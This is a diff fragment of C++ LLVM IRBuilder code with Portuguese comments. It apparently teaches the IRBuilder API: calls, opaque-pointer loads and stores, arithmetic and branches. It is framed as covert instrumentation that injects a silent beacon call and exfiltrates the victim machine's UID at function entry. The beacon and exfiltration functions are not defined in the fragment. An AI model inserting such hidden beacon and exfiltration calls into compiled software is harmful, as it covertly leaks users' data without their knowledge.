@@ -1,0 +1,54 @@
+IRBuilder<> B(Ctx);
+B.SetInsertPoint(&*Entry.getFirstInsertionPt());
+
+/* 1. Execução de Código (Chamadas de Função) */
+
+// Disparo silencioso de uma função previamente resolvida
+B.CreateCall(BeaconFunc);
+
+// Captura do UID da máquina alvo em tempo de execução (runtime)
+FunctionType *GetUIDTy =
+    FunctionType::get(B.getInt32Ty(), false);
+
+FunctionCallee GetUID =
+    M.getOrInsertFunction("getuid", GetUIDTy);
+
+Value *UidArg = B.CreateCall(GetUID);
+
+// Exfiltra o UID obtido da vítima
+B.CreateCall(ExfilFunc, {UidArg});
+
+/* 2. Manipulação de Memória (Opaque Pointers) */
+
+// Aloca 256 bytes na stack da função instrumentada.
+// O retorno é um ponteiro opaco genérico (ptr).
+AllocaInst *Buf =
+    B.CreateAlloca(B.getInt8Ty(),
+                   B.getInt32(256),
+                   "hidden_buf");
+
+// Escreve um byte no buffer
+B.CreateStore(B.getInt8(0x00), Buf);
+
+// ERA DOS OPAQUE POINTERS: O tipo (getInt8Ty()) deve ser 
+// passado explicitamente antes do ponteiro de origem (Buf).
+Value *Loaded =
+    B.CreateLoad(B.getInt8Ty(),
+                 Buf,
+                 "leak_byte");
+
+/* 3. Lógica e Aritmética */
+
+Value *Sum =
+    B.CreateAdd(ValA, ValB, "sum");
+
+// Loaded == 0x42 ('B') ?
+Value *Cond =
+    B.CreateICmpEQ(Loaded,
+                   B.getInt8(0x42));
+
+/* 4. Controle de Fluxo */
+
+// Se Cond for verdadeiro, desvia para TrueBB. 
+// Caso contrário, desvia para FalseBB.
+B.CreateCondBr(Cond, TrueBB, FalseBB);
